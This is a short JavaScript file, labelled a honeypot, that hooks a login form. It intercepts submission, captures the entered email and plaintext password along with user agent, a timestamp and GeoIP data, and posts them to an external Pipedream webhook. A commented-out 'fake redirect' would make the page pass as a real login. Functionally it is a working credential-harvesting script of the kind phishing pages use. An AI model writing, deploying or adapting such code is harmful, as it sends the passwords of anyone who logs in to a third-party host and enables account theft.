document.addEventListener('DOMContentLoaded', () => {
    console.log("✅ Honeypot JS loaded");

    const loginForm = document.getElementById('loginForm');

    if (!loginForm) {
        console.error("❌ Login form not found!");
        return;
    }

    // Add hidden trap field
    const trapField = document.createElement('input');
    trapField.type = 'text';
    trapField.name = 'trapfield';
    trapField.style.display = 'none';
    trapField.autocomplete = 'off';
    loginForm.appendChild(trapField);

    loginForm.addEventListener('submit', function (e) {
        e.preventDefault(); // 🔴 Prevent default form submit

        const email = document.querySelector('input[type="email"]').value;
        const password = document.querySelector('input[type="password"]').value;
        const trap = trapField.value;

        const payload = {
            email,
            password,
            trapField: trap,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };

        console.log("🚀 Sending to Pipedream:", payload);

        // Add GeoIP then send to Pipedream
      fetch('https://ipapi.co/json/')
  .then(res => res.json())
  .then(geo => {
    payload.geo = geo;
    return sendToPipedream(payload);
  })
  .catch(err => {
    console.warn("⚠️ GeoIP failed, sending without location:", err);
    return sendToPipedream(payload);
  });

function sendToPipedream(payload) {
  return fetch('https://eowami3tzj4yi8y.m.pipedream.net', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(res => console.log("✅ Sent to Pipedream:", res.status))
  .catch(err => console.error("❌ Failed to send to Pipedream:", err));
}


       /* setTimeout(() => {
            window.location.href = '/dashboard.html'; // fake redirect
        }, 1000);*/
    });
});
